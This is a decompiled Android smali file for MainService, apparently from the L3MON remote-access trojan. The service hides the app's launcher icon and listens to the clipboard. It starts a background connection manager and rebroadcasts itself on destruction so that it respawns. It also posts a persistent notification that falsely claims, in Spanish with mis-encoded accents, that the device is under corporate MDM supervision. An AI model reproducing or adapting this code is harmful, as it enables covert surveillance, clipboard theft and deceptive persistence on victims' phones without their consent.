.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field private static contextOfApplication:Landroid/content/Context;

.field private static final CHANNEL_ID:Ljava/lang/String; = "mdm_service_v3"

.field private static final NOTIFICATION_ID:I = 0x232a



# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 27
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 82
    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 33
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 2

    .line 76
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 77
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    .line 78
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt1"    # I
    .param p3, "paramInt2"    # I

    .line 39
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 40
    .local v0, "pkg":Landroid/content/pm/PackageManager;
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/etechd/l3mon/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x1

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 44
    new-instance v1, Lcom/etechd/l3mon/MainService$1;

    invoke-direct {v1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V

    .line 65
    .local v1, "mPrimaryChangeListener":Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;
    const-string v3, "clipboard"

    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/ClipboardManager;

    .line 66
    .local v3, "clipboardManager":Landroid/content/ClipboardManager;
    invoke-virtual {v3, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 69
    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    .line 70
    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 71
    const/16 v3, 0x232a

    invoke-direct {p0}, Lcom/etechd/l3mon/MainService;->buildNotification()Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, v3, v0}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 71
    return v2

.end method
.method private buildNotification()Landroid/app/Notification;
    .locals 5

    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "mdm_service_v3"

    const-string v2, "MDM System Service"

    const/4 v3, 0x2

    invoke-direct {v0, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v1, "notification"

    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_0

    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    new-instance v0, Landroid/app/Notification$Builder;

    const-string v1, "mdm_service_v3"

    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "Protecci\u00c3\u00b3n MDM Activa"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "El dispositivo est\u00c3\u00a1 bajo supervisi\u00c3\u00b3n corporativa."

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const v1, 0x1080037

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    return-object v0
.end method
